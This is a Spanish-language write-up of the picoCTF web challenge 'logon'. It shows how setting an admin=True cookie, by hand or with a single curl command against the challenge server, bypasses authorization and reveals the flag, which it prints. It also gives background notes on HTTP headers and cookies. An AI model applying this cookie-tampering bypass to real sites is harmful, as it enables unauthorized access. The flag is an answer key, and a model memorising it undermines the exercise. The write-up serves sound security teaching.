### logon

### Descripción

The factory is hiding things from all of its users.Can you login as Joe and find what they've been looking at? http://fickle-tempest.picoctf.net:56077
### Solución

### Solucion 1 usando cookie editor

```
Entramos a la pagina y entramos como cualquier usuario, en mi caso Jorge - Jorge (Usuario - password)

Modificamos la cookie y habilitando en la opcion admin poniendole True, quitando el False y entramos. Es decir adquirimos las opciones de administrador.

picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}

```

### Solucion 2 usando consola linux

```
curl -s http://fickle-tempest.picoctf.net:56077/flag -H "Cookie: password=Jorge; username=Jorge; admin=True" | grep pico
```
### Notas
- HTTP es un protocolo de la capa de aplicación para la transmisión de documentos hipermedia, como HTML. Fue diseñado para la comunicación entre navegadores web y servidores web, pero también puede utilizarse para otros fines, como la comunicación máquina a máquina, el acceso programático a APIs y más.
- Los Hedaers HTTP (o encabezados) permiten al cliente y al servidor pasar información adicional junto con un mensaje en una petición o respuesta. En HTTP/1.X, una cabecera consiste en un nombre que no distingue entre mayúsculas y minúsculas seguido de dos puntos, luego un espacio en blanco opcional que será ignorado, y finalmente su valor.
- Un request header (o encabezado de solicitud) es una cabecera HTTP que se puede utilizar en una petición HTTP para proporcionar información sobre el contexto de la solicitud, de modo que el servidor pueda adaptar su respuesta. Por ejemplo, las cabeceras `Accept-*` indican los formatos permitidos y preferidos de la respuesta. Otras cabeceras pueden utilizarse para suministrar credenciales de autenticación (ej., `Authorization`), para controlar el almacenamiento en caché, o para obtener información sobre el agente de usuario (_user agent_) o la página de procedencia (_referrer_), etc.
- Métodos de petición HTTP: HTTP define un conjunto de métodos de petición para indicar el propósito de la solicitud y lo que se espera si esta tiene éxito. Aunque también pueden ser sustantivos, a estos métodos a veces se les conoce como verbos HTTP. Cada método tiene su propia semántica, pero hay algunas características que se comparten entre varios métodos; en concreto, los métodos de petición pueden ser seguros (_safe_), idempotentes (_idempotent_) o almacenables en caché (_cacheable_).
- Una cookie HTTP (también llamada cookie web, cookie de Internet, cookie de navegador, o simplemente cookie) es un pequeño bloque de datos creado por un servidor web mientras un usuario navega por un sitio web, el cual es guardado en la computadora u otro dispositivo del usuario por su navegador web
### Referencias
- https://developer.mozilla.org/en-US/docs/Web/HTTP
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers
- https://developer.mozilla.org/en-US/docs/Glossary/Request_header
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods
- https://en.wikipedia.org/wiki/HTTP_cookie